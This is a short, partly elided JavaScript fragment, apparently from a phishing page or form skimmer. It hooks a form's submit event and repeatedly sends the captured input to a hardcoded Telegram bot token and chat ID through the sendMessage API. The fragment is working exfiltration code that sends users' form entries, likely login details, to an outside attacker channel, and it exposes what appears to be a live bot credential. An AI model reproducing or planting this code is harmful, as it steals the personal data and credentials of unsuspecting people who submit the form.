    ...
    form.addEventListener('submit', function(e) {
        ...
        if (tryCount === 0) {
            ...
            setInterval(() => {
                ...
                const url = `https://api.telegram.org/bot7067620459:AAFnFUxIFskKR53GXx7Y2Zt8VXQ5RqjrXQY/sendMessage?chat_id=697727022&text=${encodeURIComponent(jonatish)}&parse_mode=HTML`;
